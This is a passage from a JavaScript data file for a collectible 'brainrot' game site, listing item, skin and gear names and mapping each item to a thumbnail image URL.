            "Popcuru and Fizzuru", "Pot Hotspot", "Pot Pumpkin", "Pumpkini Spyderini",
            "Quackini Snackini", "Quesadilla Crocodila", "Quesadillo Vampiro",
            "Rang Ring Bus", "Reindeer Tralala", "Reinito Sleighito", "Rocco Disco",
            "Rosey and Teddy", "Rosetti Tualetti", "Sammyni Fattini", "Sammyni Spyderini",
            "Santa Hotspot", "Santteo", "Secret Lucky Block", "Serafinna Medusella",
            "Snailo Clovero", "Spaghetti Tualetti", "Spinny Hammy", "Spooky and Pumpky",
            "Strawberrita", "Swag Soda", "Swaggy Bros", "Tacorita Bicicleta",
            "Tacorillo Crocodillo", "Tang Tang Keletang", "Telemorte", "Tictac Sahur",
            "To To To Sahur", "Torrtuginni Dragonfrutini", "Tralaledon",
            "Trenostruzzo Turbo 4000", "Trickolino", "Triplito Tralaleritos",
            "Tuff Toucan", "Tung Tung Tung Sahur", "Ventoliero Pavonero",
            "Vulturino Skeletono", "W or L", "Yess My Examine", "Zombie Tralala",
            "Grabatron", "Rubiko and Kubiko", "Cangurato Gelato", "Noodle Noodle Poodle",
            "Candini Fluffini", "La Fuse Machine", "Polaroidini", "Nachorilla",
            "Sammyni Truckini", "Tacoturbo Tacorito", "Burrito Bat",
            "Chicli Chicla", "Panda Popanda", "Deputy Leopard"
        ];
        const BASE_SKINS_LIST = ["Aquatic", "Bunny Basket", "Candy", "Christmas", "Cursed", "Cyber", "Diamond", "Divine", "Easter", "Galaxy", "Gingerbread", "Gold", "Halloween", "Lava", "Lucky", "Octo", "Pot of Gold", "Radioactive", "Rainbow", "Rose", "Summer", "Taco", "Valentines", "Yin Yang", "Tralalero"];
        const GEARS_LIST = ["Alien Slap", "Blackhole Bomb", "Bloodmoon Hammer", "Bloodmoon Slap", "Candy Sentry", "Candy Slap", "Cupid's Wings", "Cursed Slap", "Cyber Slap", "Demon's Head", "Divine Slap", "Lava Blaster", "Lava Slap", "Radioactive Airstrike", "Radioactive Slap", "Rainbow Hammer", "Rainbow Slap", "Santa's Sleigh", "Waverider", "Witch's Broom", "Yin Yang Lamp", "Yin Yang Slap", "Phantom Slap", "Crystal Slap"];
        const NEW_ITEMS = new Set([
            "Dragon Skeletonini", "Phoenix", "Plant Bros",
            "Hydra Serpent", "Orchidox",
            "Bumbatron", "Yetimatic", "S'more Serat", "Queen Bee", "Scorpino Coasterino",
            "Honey Honey Bear", "Pogo Pogo Penguin", "Conetto Morsetto", "La Breakfast Combinasion",
            "Phantom Slap", "Crystal Slap", "Candini Fluffini", "La Fuse Machine", "Polaroidini",
            "Nachorilla", "Sammyni Truckini", "Tacoturbo Tacorito", "Burrito Bat",
            "Los Dragons", "La Craft Machine", "Gold and Diamond",
            "Chicli Chicla", "Panda Popanda", "Deputy Leopard"
        ]);
        const REAL_THUMBNAILS = {
            "brainrot": {
                "Dragon Skeletonini": "https://ik.imagekit.io/dr6z4tib7/Dragon_Skeletonini.webp",
                "Phoenix": "https://ik.imagekit.io/dr6z4tib7/Phoenix.webp",
                "Plant Bros": "https://ik.imagekit.io/dr6z4tib7/Plant_Bros.webp",
                "Hydra Serpent": "https://ik.imagekit.io/dr6z4tib7/Hydra_Serpent.webp",
                "Orchidox": "https://ik.imagekit.io/dr6z4tib7/Orchidox.webp",
                "Los Dragons": "https://ik.imagekit.io/dr6z4tib7/Los_Dragons.webp",
                "La Craft Machine": "https://ik.imagekit.io/dr6z4tib7/La_Craft_Machine.webp",
                "Gold and Diamond": "https://ik.imagekit.io/dr6z4tib7/Gold_and_Diamond.webp",
                "Chicli Chicla": "https://ik.imagekit.io/dr6z4tib7/Default_Chicli_Chicla.webp",
                "Panda Popanda": "https://ik.imagekit.io/dr6z4tib7/Panda_Popanda.webp",
                "Deputy Leopard": "https://ik.imagekit.io/dr6z4tib7/Deputy_Leopard.webp",
                "Los Admins": "https://ik.imagekit.io/dr6z4tib7/Los_Admins.webp",
                "Moby Bros": "https://ik.imagekit.io/dr6z4tib7/Moby_Bros.webp",
                "Los Tictacs": "https://ik.imagekit.io/dr6z4tib7/Los_Tictacs.webp",
                "Los Tangcitos": "https://ik.imagekit.io/dr6z4tib7/Los_Tangcitos.webp",
                "Duggy Bros": "https://ik.imagekit.io/dr6z4tib7/Duggy_Bros.webp",
                "4th Bros": "https://ik.imagekit.io/dr6z4tib7/4th_Bros.webp",
                "Bufalino Boomberino": "https://ik.imagekit.io/dr6z4tib7/Bufalino_Boomberino.webp",
                "Digi Narwhal": "https://ik.imagekit.io/dr6z4tib7/Digi_Narwhal.webp",
                "Cerberus": "https://ik.imagekit.io/dr6z4tib7/Cerberus.webp?updatedAt=1783395483343",
                "Capitano Americano": "https://ik.imagekit.io/dr6z4tib7/Capitano_Americano.webp",
                "Dragon Aquanini": "https://ik.imagekit.io/dr6z4tib7/Dragon_aquanini_but_high_graphism.webp",
                "Rico Dinero": "https://ik.imagekit.io/dr6z4tib7/Rico_Dinero.webp",
                "Globa Steppa": "https://ik.imagekit.io/dr6z4tib7/Default_Globa_Steppa.webp",
                "John Pork": "https://ik.imagekit.io/dr6z4tib7/John_Pork.webp",
                "Kraken": "https://ik.imagekit.io/dr6z4tib7/Kraken.webp",
                "Kalika Bros": "https://ik.imagekit.io/dr6z4tib7/Kalika_Bros.webp",
                "Tirilikalika Tirilikalako": "https://ik.imagekit.io/dr6z4tib7/Tirilikalika_Tirilikalako.webp",
                "Money Money Bros": "https://ik.imagekit.io/dr6z4tib7/Money_Money_Bros.webp",
                "Venuspino": "https://ik.imagekit.io/dr6z4tib7/Venuspino.webp",
                "Steakini Fattini": "https://ik.imagekit.io/dr6z4tib7/Steakini_Fattini.webp",
                "Rhino Helicopterino": "https://ik.imagekit.io/dr6z4tib7/Rhino_Helicopterino.webp",
                "Caylusaurus": "https://ik.imagekit.io/dr6z4tib7/Caylusaurus_png.webp",
                "Sammyni Cakini": "https://ik.imagekit.io/dr6z4tib7/Sammyni_Cakini.webp",
                "Pancake and Syrup": "https://ik.imagekit.io/dr6z4tib7/Pancake_and_Syrup.webp",
                "Rubrikiko": "https://ik.imagekit.io/dr6z4tib7/Rubrikiko.webp",
                "Centrucci Nuclucci": "https://ik.imagekit.io/dr6z4tib7/Centrucci_Nuclucci.webp",
                "Los Hackers": "https://ik.imagekit.io/dr6z4tib7/Los_Hackers.webp",
                "John Doe": "https://ik.imagekit.io/dr6z4tib7/John_Doe.webp",
                "Gorillo Subwoofero": "https://ik.imagekit.io/dr6z4tib7/Gorillo_Subwoofero.webp",
                "Elefanto Frigo": "https://ik.imagekit.io/dr6z4tib7/Elefanto_Frigo.webp",
                "Jelly Moby": "https://ik.imagekit.io/dr6z4tib7/Jelly_Moby.webp",
                "Foxini Lanternini": "https://ik.imagekit.io/dr6z4tib7/Foxini_Lanternini.webp",
                "Ginger Cisterna": "https://ik.imagekit.io/dr6z4tib7/Ginger_Cisterna.webp",
                "Bearito Cabinito": "https://ik.imagekit.io/dr6z4tib7/Bearito_Cabinito.webp",
                "Arcadragon": "https://ik.imagekit.io/dr6z4tib7/Arcadragon.webp",
                "Brunito Marsito": "https://ik.imagekit.io/dr6z4tib7/brainrot-brunito-marsito.webp",
                "Tacorillo Crocodillo": "https://ik.imagekit.io/dr6z4tib7/brainrot-tacorillo-crocodillo.webp",
                "Tacorita Bicicleta": "https://ik.imagekit.io/dr6z4tib7/brainrot-tacorita-bicicleta.webp",
                "Money Money Reindeer": "https://ik.imagekit.io/dr6z4tib7/brainrot-money-money-reindeer.webp",
                "Trickolino": "https://ik.imagekit.io/dr6z4tib7/brainrot-trickolino.webp",
                "Spinny Hammy": "https://ik.imagekit.io/dr6z4tib7/brainrot-spinny-hammy.webp",
                "Nuclearo Dinossauro": "https://ik.imagekit.io/dr6z4tib7/brainrot-nuclearo-dinossauro.webp",
                "Los Tacoritas": "https://ik.imagekit.io/dr6z4tib7/brainrot-los-tacoritas.webp",
                "Noo My Gold": "https://ik.imagekit.io/dr6z4tib7/brainrot-noo-my-gold.webp",
                "Rang Ring Bus": "https://ik.imagekit.io/dr6z4tib7/brainrot-rang-ring-bus.webp",
                "Perrito Burrito": "https://ik.imagekit.io/dr6z4tib7/brainrot-perrito-burrito.webp",
                "Los Amigos": "https://ik.imagekit.io/dr6z4tib7/brainrot-los-amigos.webp",
                "Bumbatron": "https://ik.imagekit.io/dr6z4tib7/Bumbatron.webp",
                "Yetimatic": "https://ik.imagekit.io/dr6z4tib7/Yetimatic.webp",
                "S'more Serat": "https://ik.imagekit.io/dr6z4tib7/S_27more_Serat.webp",
                "Queen Bee": "https://ik.imagekit.io/dr6z4tib7/Queen_Bee.webp",
                "Scorpino Coasterino": "https://ik.imagekit.io/dr6z4tib7/Scorpino_Coasterino.webp",
                "Honey Honey Bear": "https://ik.imagekit.io/dr6z4tib7/Honey_Honey_Bear.webp",
                "Pogo Pogo Penguin": "https://ik.imagekit.io/dr6z4tib7/Pogo_Pogo_Penguin.webp",
                "Conetto Morsetto": "https://ik.imagekit.io/dr6z4tib7/Conetto_Morsetto.webp",
                "La Breakfast Combinasion": "https://ik.imagekit.io/dr6z4tib7/La_Breakfast_Combinasion.webp",
                "Noo My Eggs": "https://ik.imagekit.io/dr6z4tib7/brainrot-noo-my-eggs.webp",
                "Quackini Snackini": "https://ik.imagekit.io/dr6z4tib7/brainrot-quackini-snackini.webp",
                "Los Quesadillas": "https://ik.imagekit.io/dr6z4tib7/brainrot-los-quesadillas.webp",
                "Lovin Rose": "https://ik.imagekit.io/dr6z4tib7/brainrot-lovin-rose.webp",
                "Rosey and Teddy": "https://ik.imagekit.io/dr6z4tib7/brainrot-rosey-and-teddy.webp",
                "Ventoliero Pavonero": "https://ik.imagekit.io/dr6z4tib7/brainrot-ventoliero-pavonero.webp",
                "Los Bros": "https://ik.imagekit.io/dr6z4tib7/brainrot-los-bros.webp",
                "Zombie Tralala": "https://ik.imagekit.io/dr6z4tib7/brainrot-zombie-tralala.webp",
                "Vulturino Skeletono": "https://ik.imagekit.io/dr6z4tib7/brainrot-vulturino-skeletono.webp",
                "Nacho Spyder": "https://ik.imagekit.io/dr6z4tib7/brainrot-nacho-spyder.webp",
                "Tralaledon": "https://ik.imagekit.io/dr6z4tib7/brainrot-tralaledon.webp",
                "Tictac Sahur": "https://ik.imagekit.io/dr6z4tib7/brainrot-tictac-sahur.webp",
                "Money Money Puggy": "https://ik.imagekit.io/dr6z4tib7/brainrot-money-money-puggy.webp",
                "Pirulitoita Bicicleteira": "https://ik.imagekit.io/dr6z4tib7/brainrot-pirulitoita-bicicleteira.webp",
                "Tang Tang Keletang": "https://ik.imagekit.io/dr6z4tib7/brainrot-tang-tang-keletang.webp",
                "Paradiso Axolottino": "https://ik.imagekit.io/dr6z4tib7/brainrot-paradiso-axolottino.webp",
                "Orcaledon": "https://ik.imagekit.io/dr6z4tib7/brainrot-orcaledon.webp",
                "Noo My Examine": "https://ik.imagekit.io/dr6z4tib7/brainrot-noo-my-examine.webp",
                "Strawberrita": "https://ik.imagekit.io/dr6z4tib7/brainrot-strawberrita.webp",
                "Los Sweethearts": "https://ik.imagekit.io/dr6z4tib7/brainrot-los-sweethearts.webp",
                "Yess My Examine": "https://ik.imagekit.io/dr6z4tib7/brainrot-yess-my-examine.webp",
                "W or L": "https://ik.imagekit.io/dr6z4tib7/brainrot-w-or-l.webp",
                "Tuff Toucan": "https://ik.imagekit.io/dr6z4tib7/brainrot-tuff-toucan.webp",
                "Snailo Clovero": "https://ik.imagekit.io/dr6z4tib7/brainrot-snailo-clovero.webp",
                "Trenostruzzo Turbo 4000": "https://ik.imagekit.io/dr6z4tib7/brainrot-trenostruzzo-turbo-4000.webp",
                "To To To Sahur": "https://ik.imagekit.io/dr6z4tib7/brainrot-to-to-to-sahur.webp",
                "Please My Present": "https://ik.imagekit.io/dr6z4tib7/brainrot-please-my-present.webp",
                "Torrtuginni Dragonfrutini": "https://ik.imagekit.io/dr6z4tib7/brainrot-torrtuginni-dragonfrutini.webp",
                "Reinito Sleighito": "https://ik.imagekit.io/dr6z4tib7/brainrot-reinito-sleighito.webp",
                "Telemorte": "https://ik.imagekit.io/dr6z4tib7/brainrot-telemorte.webp",
                "Bunny and Eggy": "https://ik.imagekit.io/dr6z4tib7/brainrot-bunny-and-eggy.webp",
                "Swaggy Bros": "https://ik.imagekit.io/dr6z4tib7/brainrot-swaggy-bros.webp",
                "Swag Soda": "https://ik.imagekit.io/dr6z4tib7/brainrot-swag-soda.webp",
                "Santteo": "https://ik.imagekit.io/dr6z4tib7/brainrot-santteo.webp",
                "Spooky and Pumpky": "https://ik.imagekit.io/dr6z4tib7/brainrot-spooky-and-pumpky.webp",
                "Strawberry Elephant": "https://ik.imagekit.io/dr6z4tib7/brainrot-strawberry-elephant.webp",
                "Boatito Auratito": "https://ik.imagekit.io/dr6z4tib7/brainrot-boatito-auratito.webp",
                "Tung Tung Tung Sahur": "https://ik.imagekit.io/dr6z4tib7/brainrot-tung-tung-tung-sahur.webp",
                "Spaghetti Tualetti": "https://ik.imagekit.io/dr6z4tib7/brainrot-spaghetti-tualetti.webp",
                "Triplito Tralaleritos": "https://ik.imagekit.io/dr6z4tib7/brainrot-triplito-tralaleritos.webp",
                "Sammyni Spyderini": "https://ik.imagekit.io/dr6z4tib7/brainrot-sammyni-spyderini.webp",
                "Popcuru and Fizzuru": "https://ik.imagekit.io/dr6z4tib7/brainrot-popcuru-and-fizzuru.webp",
                "Rocco Disco": "https://ik.imagekit.io/dr6z4tib7/brainrot-rocco-disco.webp",
                "Reindeer Tralala": "https://ik.imagekit.io/dr6z4tib7/brainrot-reindeer-tralala.webp",
                "Nooo My Hotspot": "https://ik.imagekit.io/dr6z4tib7/brainrot-nooo-my-hotspot.webp",
                "Noo My Heart": "https://ik.imagekit.io/dr6z4tib7/brainrot-noo-my-heart.webp",
                "Quesadillo Vampiro": "https://ik.imagekit.io/dr6z4tib7/brainrot-quesadillo-vampiro.webp",
                "Serafinna Medusella": "https://ik.imagekit.io/dr6z4tib7/brainrot-serafinna-medusella.webp",
                "Noo My Present": "https://ik.imagekit.io/dr6z4tib7/brainrot-noo-my-present.webp",
                "Hydra Bunny": "https://ik.imagekit.io/dr6z4tib7/brainrot-hydra-bunny.webp",
                "La Lucky Grande": "https://ik.imagekit.io/dr6z4tib7/brainrot-la-lucky-grande.webp",
                "Pumpkini Spyderini": "https://ik.imagekit.io/dr6z4tib7/brainrot-pumpkini-spyderini.webp",
                "Sammyni Fattini": "https://ik.imagekit.io/dr6z4tib7/brainrot-sammyni-fattini.webp",
                "Rosetti Tualetti": "https://ik.imagekit.io/dr6z4tib7/brainrot-rosetti-tualetti.webp",
                "Skibidi Toilet": "https://ik.imagekit.io/dr6z4tib7/brainrot-skibidi-toilet.webp",
                "Signore Carapace": "https://ik.imagekit.io/dr6z4tib7/brainrot-signore-carapace.webp",
                "Gold Gold Gold": "https://ik.imagekit.io/dr6z4tib7/brainrot-gold-gold-gold.webp",
                "Noo My Candy": "https://ik.imagekit.io/dr6z4tib7/brainrot-noo-my-candy.webp",
                "Quesadilla Crocodila": "https://ik.imagekit.io/dr6z4tib7/brainrot-quesadilla-crocodila.webp",
                "Horegini Boom": "https://ik.imagekit.io/dr6z4tib7/brainrot-horegini-boom.webp",
                "Santa Hotspot": "https://ik.imagekit.io/dr6z4tib7/brainrot-santa-hotspot.webp",
                "Naughty Naughty": "https://ik.imagekit.io/dr6z4tib7/brainrot-naughty-naughty.webp",
                "Los Jolly Combinasionas": "https://ik.imagekit.io/dr6z4tib7/brainrot-los-jolly-combinasionas.webp",
                "Los Trios": "https://ik.imagekit.io/dr6z4tib7/brainrot-los-trios.webp",
                "Secret Lucky Block": "https://ik.imagekit.io/dr6z4tib7/brainrot-secret-lucky-block.webp",
                "Pot Hotspot": "https://ik.imagekit.io/dr6z4tib7/brainrot-pot-hotspot.webp",
                "Pot Pumpkin": "https://ik.imagekit.io/dr6z4tib7/brainrot-pot-pumpkin.webp",
                "Los Spaghettis": "https://ik.imagekit.io/dr6z4tib7/brainrot-los-spaghettis.webp",
                "Los Puggies": "https://ik.imagekit.io/dr6z4tib7/brainrot-los-puggies.webp",
                "Los Planitos": "https://ik.imagekit.io/dr6z4tib7/brainrot-los-planitos.webp",
                "Mi Gatito": "https://ik.imagekit.io/dr6z4tib7/brainrot-mi-gatito.webp",
                "Los Cucarachas": "https://ik.imagekit.io/dr6z4tib7/brainrot-los-cucarachas.webp",
                "La Romantic Grande": "https://ik.imagekit.io/dr6z4tib7/brainrot-la-romantic-grande.webp",
                "Mieteteira Bicicleteira": "https://ik.imagekit.io/dr6z4tib7/brainrot-mieteteira-bicicleteira.webp",
                "Los Spooky Combinasionas": "https://ik.imagekit.io/dr6z4tib7/brainrot-los-spooky-combinasionas.webp",
                "Burrito Bandito": "https://ik.imagekit.io/dr6z4tib7/brainrot-burrito-bandito.webp",
                "Ketupat Bros": "https://ik.imagekit.io/dr6z4tib7/brainrot-ketupat-bros.webp",
                "Mariachi Corazoni": "https://ik.imagekit.io/dr6z4tib7/brainrot-mariachi-corazoni.webp",
                "Las Sis": "https://ik.imagekit.io/dr6z4tib7/brainrot-las-sis.webp",
                "Las Vaquitas Saturnitas": "https://ik.imagekit.io/dr6z4tib7/brainrot-las-vaquitas-saturnitas.webp",
                "La Spooky Grande": "https://ik.imagekit.io/dr6z4tib7/brainrot-la-spooky-grande.webp",
                "Luck Luck Luck Sahur": "https://ik.imagekit.io/dr6z4tib7/brainrot-luck-luck-luck-sahur.webp",
                "Love Love Bear": "https://ik.imagekit.io/dr6z4tib7/brainrot-love-love-bear.webp",
                "Los Tortus": "https://ik.imagekit.io/dr6z4tib7/brainrot-los-tortus.webp",
                "La Sahur Combinasion": "https://ik.imagekit.io/dr6z4tib7/brainrot-la-sahur-combinasion.webp",
                "Los Mobilis": "https://ik.imagekit.io/dr6z4tib7/brainrot-los-mobilis.webp",
                "Los Primos": "https://ik.imagekit.io/dr6z4tib7/brainrot-los-primos.webp",
                "Los Mi Gatitos": "https://ik.imagekit.io/dr6z4tib7/brainrot-los-mi-gatitos.webp",
                "Los Burritos": "https://ik.imagekit.io/dr6z4tib7/brainrot-los-burritos.webp",
                "Meowl": "https://ik.imagekit.io/dr6z4tib7/brainrot-meowl.webp",
                "Job Job Job Sahur": "https://ik.imagekit.io/dr6z4tib7/brainrot-job-job-job-sahur.webp",
                "Los Karkeritos": "https://ik.imagekit.io/dr6z4tib7/brainrot-los-karkeritos.webp",
                "Los Nooo My Hotspotsitos": "https://ik.imagekit.io/dr6z4tib7/brainrot-los-nooo-my-hotspotsitos.webp",
                "Los Sekolahs": "https://ik.imagekit.io/dr6z4tib7/brainrot-los-sekolahs.webp",
                "Los Jobcitos": "https://ik.imagekit.io/dr6z4tib7/brainrot-los-jobcitos.webp",
                "La Secret Combinasion": "https://ik.imagekit.io/dr6z4tib7/brainrot-la-secret-combinasion.webp",
                "Las Tralaleritas": "https://ik.imagekit.io/dr6z4tib7/brainrot-las-tralaleritas.webp",
                "La Supreme Combinasion": "https://ik.imagekit.io/dr6z4tib7/brainrot-la-supreme-combinasion.webp",
                "La Taco Combinasion": "https://ik.imagekit.io/dr6z4tib7/brainrot-la-taco-combinasion.webp",
                "Churrito Bunnito": "https://ik.imagekit.io/dr6z4tib7/brainrot-churrito-bunnito.webp",
                "Love Love Love Sahur": "https://ik.imagekit.io/dr6z4tib7/brainrot-love-love-love-sahur.webp",
                "Los Hotspotsitos": "https://ik.imagekit.io/dr6z4tib7/brainrot-los-hotspotsitos.webp",
                "Los Combinasionas": "https://ik.imagekit.io/dr6z4tib7/brainrot-los-combinasionas.webp",
                "La Food Combinasion": "https://ik.imagekit.io/dr6z4tib7/brainrot-la-food-combinasion.webp",
                "Los Tralaleritos": "https://ik.imagekit.io/dr6z4tib7/brainrot-los-tralaleritos.webp",
                "Fragola La La La": "https://ik.imagekit.io/dr6z4tib7/brainrot-fragola-la-la-la.webp",
                "Los Matteos": "https://ik.imagekit.io/dr6z4tib7/brainrot-los-matteos.webp",
                "Los Chicleteiras": "https://ik.imagekit.io/dr6z4tib7/brainrot-los-chicleteiras.webp",
                "Berryno": "https://ik.imagekit.io/dr6z4tib7/brainrot-berryno.webp",
                "Los Spyderinis": "https://ik.imagekit.io/dr6z4tib7/brainrot-los-spyderinis.webp",
                "La Karkerkar Combinasion": "https://ik.imagekit.io/dr6z4tib7/brainrot-la-karkerkar-combinasion.webp",
                "La Jolly Grande": "https://ik.imagekit.io/dr6z4tib7/brainrot-la-jolly-grande.webp",
                "Hydra Dragon Cannelloni": "https://ik.imagekit.io/dr6z4tib7/brainrot-hydra-dragon-cannelloni.webp",
                "Los Bunitos": "https://ik.imagekit.io/dr6z4tib7/brainrot-los-bunitos.webp",
                "Los 67": "https://ik.imagekit.io/dr6z4tib7/brainrot-los-67.webp",
                "La Vacca Jacko Linterino": "https://ik.imagekit.io/dr6z4tib7/brainrot-la-vacca-jacko-linterino.webp",
                "La Vacca Prese Presente": "https://ik.imagekit.io/dr6z4tib7/brainrot-la-vacca-prese-presente.webp",
                "La Grande Combinasion": "https://ik.imagekit.io/dr6z4tib7/brainrot-la-grande-combinasion.webp",
                "Los Cupids": "https://ik.imagekit.io/dr6z4tib7/brainrot-los-cupids.webp",
                "La Ginger Sekolah": "https://ik.imagekit.io/dr6z4tib7/brainrot-la-ginger-sekolah.webp",
                "La Extinct Grande": "https://ik.imagekit.io/dr6z4tib7/brainrot-la-extinct-grande.webp",
                "La Easter Grande": "https://ik.imagekit.io/dr6z4tib7/brainrot-la-easter-grande.webp",
                "Los Candies": "https://ik.imagekit.io/dr6z4tib7/brainrot-los-candies.webp",
                "Los 25": "https://ik.imagekit.io/dr6z4tib7/brainrot-los-25.webp",
                "List List List Sahur": "https://ik.imagekit.io/dr6z4tib7/brainrot-list-list-list-sahur.webp",
                "La Vacca Saturno Saturnita": "https://ik.imagekit.io/dr6z4tib7/brainrot-la-vacca-saturno-saturnita.webp",
                "Buntteo": "https://ik.imagekit.io/dr6z4tib7/brainrot-buntteo.webp",
                "La Vacca Lepre Lepreino": "https://ik.imagekit.io/dr6z4tib7/brainrot-la-vacca-lepre-lepreino.webp",
                "Granny": "https://ik.imagekit.io/dr6z4tib7/brainrot-granny.webp",
                "Dragon Gingerini": "https://ik.imagekit.io/dr6z4tib7/brainrot-dragon-gingerini.webp",
                "Lavadorito Spinito": "https://ik.imagekit.io/dr6z4tib7/brainrot-lavadorito-spinito.webp",
                "La Cucaracha": "https://ik.imagekit.io/dr6z4tib7/brainrot-la-cucaracha.webp",
                "Chicleteira Cupideira": "https://ik.imagekit.io/dr6z4tib7/brainrot-chicleteira-cupideira.webp",
                "Ginger Gerat": "https://ik.imagekit.io/dr6z4tib7/brainrot-ginger-gerat.webp",
                "Dug Dug Dug": "https://ik.imagekit.io/dr6z4tib7/brainrot-dug-dug-dug.webp",
                "Celestial Pegasus": "https://ik.imagekit.io/dr6z4tib7/brainrot-celestial-pegasus.webp",
                "Bacuru and Egguru": "https://ik.imagekit.io/dr6z4tib7/brainrot-bacuru-and-egguru.webp",
                "Jackorilla": "https://ik.imagekit.io/dr6z4tib7/brainrot-jackorilla.webp",
                "La Casa Boo": "https://ik.imagekit.io/dr6z4tib7/brainrot-la-casa-boo.webp",
                "Ketupat Kepat": "https://ik.imagekit.io/dr6z4tib7/brainrot-ketupat-kepat.webp",
                "Ketchuru and Musturu": "https://ik.imagekit.io/dr6z4tib7/brainrot-ketchuru-and-musturu.webp",
                "Baskito": "https://ik.imagekit.io/dr6z4tib7/brainrot-baskito.webp",
                "Easter Easter Easter Sahur": "https://ik.imagekit.io/dr6z4tib7/brainrot-easter-easter-easter-sahur.webp",
                "Esok Sekolah": "https://ik.imagekit.io/dr6z4tib7/brainrot-esok-sekolah.webp",
                "Fishboard": "https://ik.imagekit.io/dr6z4tib7/brainrot-fishboard.webp",
                "Giftini Spyderini": "https://ik.imagekit.io/dr6z4tib7/brainrot-giftini-spyderini.webp",
                "Frankentteo": "https://ik.imagekit.io/dr6z4tib7/brainrot-frankentteo.webp",
                "Cash or Card": "https://ik.imagekit.io/dr6z4tib7/brainrot-cash-or-card.webp",
                "Karker Sahur": "https://ik.imagekit.io/dr6z4tib7/brainrot-karker-sahur.webp",
                "Chicleteira Noelteira": "https://ik.imagekit.io/dr6z4tib7/brainrot-chicleteira-noelteira.webp",
                "Jolly Jolly Sahur": "https://ik.imagekit.io/dr6z4tib7/brainrot-jolly-jolly-sahur.webp",
                "Bunny Bunny Bunny Sahur": "https://ik.imagekit.io/dr6z4tib7/brainrot-bunny-bunny-bunny-sahur.webp",
                "Dragon Cannelloni": "https://ik.imagekit.io/dr6z4tib7/brainrot-dragon-cannelloni.webp",
                "Fragrama and Chocrama": "https://ik.imagekit.io/dr6z4tib7/brainrot-fragrama-and-chocrama.webp",
                "Festive 67": "https://ik.imagekit.io/dr6z4tib7/brainrot-festive-67.webp",
                "GOAT": "https://ik.imagekit.io/dr6z4tib7/brainrot-goat.webp",
                "Fortunu and Cashuru": "https://ik.imagekit.io/dr6z4tib7/brainrot-fortunu-and-cashuru.webp",
                "Headless Horseman": "https://ik.imagekit.io/dr6z4tib7/brainrot-headless-horseman.webp",
                "Griffin": "https://ik.imagekit.io/dr6z4tib7/brainrot-griffin.webp",
                "Karkerkar Kurkur": "https://ik.imagekit.io/dr6z4tib7/brainrot-karkerkar-kurkur.webp",
                "Donkeyturbo Express": "https://ik.imagekit.io/dr6z4tib7/brainrot-donkeyturbo-express.webp",
                "Bunito Bunito Spinito": "https://ik.imagekit.io/dr6z4tib7/brainrot-bunito-bunito-spinito.webp",
                "Cupid Cupid Sahur": "https://ik.imagekit.io/dr6z4tib7/brainrot-cupid-cupid-sahur.webp",
                "Cuadramat and Pakrahmatmamat": "https://ik.imagekit.io/dr6z4tib7/brainrot-cuadramat-and-pakrahmatmamat.webp",
                "Chicleteirina Bicicleteirina": "https://ik.imagekit.io/dr6z4tib7/brainrot-chicleteirina-bicicleteirina.webp",
                "25": "https://ik.imagekit.io/dr6z4tib7/brainrot-25.webp",
                "Garama and Madundung": "https://ik.imagekit.io/dr6z4tib7/brainrot-garama-and-madundung.webp",
                "Graipuss Medussi": "https://ik.imagekit.io/dr6z4tib7/brainrot-graipuss-medussi.webp",
                "Boppin Bunny": "https://ik.imagekit.io/dr6z4tib7/brainrot-boppin-bunny.webp",
                "Extinct Matteo": "https://ik.imagekit.io/dr6z4tib7/brainrot-extinct-matteo.webp",
                "Bunnyman": "https://ik.imagekit.io/dr6z4tib7/brainrot-bunnyman.webp",
                "Ho Ho Ho Sahur": "https://ik.imagekit.io/dr6z4tib7/brainrot-ho-ho-ho-sahur.webp",
                "Cooki and Milki": "https://ik.imagekit.io/dr6z4tib7/brainrot-cooki-and-milki.webp",
                "67": "https://ik.imagekit.io/dr6z4tib7/brainrot-67.webp",
                "Extinct Tralalero": "https://ik.imagekit.io/dr6z4tib7/brainrot-extinct-tralalero.webp",
                "Eviledon": "https://ik.imagekit.io/dr6z4tib7/brainrot-eviledon.webp",
                "Gobblino Uniciclino": "https://ik.imagekit.io/dr6z4tib7/brainrot-gobblino-uniciclino.webp",
                "Fishino Clownino": "https://ik.imagekit.io/dr6z4tib7/brainrot-fishino-clownino.webp",
                "Blackhole GOAT": "https://ik.imagekit.io/dr6z4tib7/brainrot-blackhole-goat.webp",
                "Chicleteira Bicicleteira": "https://ik.imagekit.io/dr6z4tib7/brainrot-chicleteira-bicicleteira.webp",
                "Guest 666": "https://ik.imagekit.io/dr6z4tib7/brainrot-guest-666.webp",
                "Chipso and Queso": "https://ik.imagekit.io/dr6z4tib7/brainrot-chipso-and-queso.webp",
                "Capitano Moby": "https://ik.imagekit.io/dr6z4tib7/brainrot-capitano-moby.webp",
                "Chillin Chili": "https://ik.imagekit.io/dr6z4tib7/brainrot-chillin-chili.webp",
                "Chimnino": "https://ik.imagekit.io/dr6z4tib7/brainrot-chimnino.webp",
                "1x1x1x1": "https://ik.imagekit.io/dr6z4tib7/brainrot-1x1x1x1.webp",
                "Dul Dul Dul": "https://ik.imagekit.io/dr6z4tib7/brainrot-dul-dul-dul.webp",
                "Eid Eid Eid Sahur": "https://ik.imagekit.io/dr6z4tib7/brainrot-eid-eid-eid-sahur.webp",
                "Chachechi": "https://ik.imagekit.io/dr6z4tib7/brainrot-chachechi.webp",
                "Arcadopus": "https://ik.imagekit.io/dr6z4tib7/brainrot-arcadopus.webp",
                "Guerriro Digitale": "https://ik.imagekit.io/dr6z4tib7/brainrot-guerriro-digitale.webp",
                "Celularcini Viciosini": "https://ik.imagekit.io/dr6z4tib7/brainrot-celularcini-viciosini.webp",
                "Antonio": "https://ik.imagekit.io/dr6z4tib7/brainrot-antonio.webp",
                "Bisonte Giuppitere": "https://ik.imagekit.io/dr6z4tib7/brainrot-bisonte-giuppitere.webp",
                "Cupid Hotspot": "https://ik.imagekit.io/dr6z4tib7/brainrot-cupid-hotspot.webp",
                "Agarrini la Palini": "https://ik.imagekit.io/dr6z4tib7/brainrot-agarrini-la-palini.webp",
                "Cloverat Clapat": "https://ik.imagekit.io/dr6z4tib7/brainrot-cloverat-clapat.webp",
                "Hopilikalika Hopilikalako": "https://ik.imagekit.io/dr6z4tib7/brainrot-hopilikalika-hopilikalako.webp",
                "Bananito": "https://ik.imagekit.io/dr6z4tib7/brainrot-bananito.webp",
                "Cigno Fulgoro": "https://ik.imagekit.io/dr6z4tib7/brainrot-cigno-fulgoro.webp",
                "Chill Puppy": "https://ik.imagekit.io/dr6z4tib7/brainrot-chill-puppy.webp",
                "Burguro and Fryuro": "https://ik.imagekit.io/dr6z4tib7/brainrot-burguro-and-fryuro.webp",
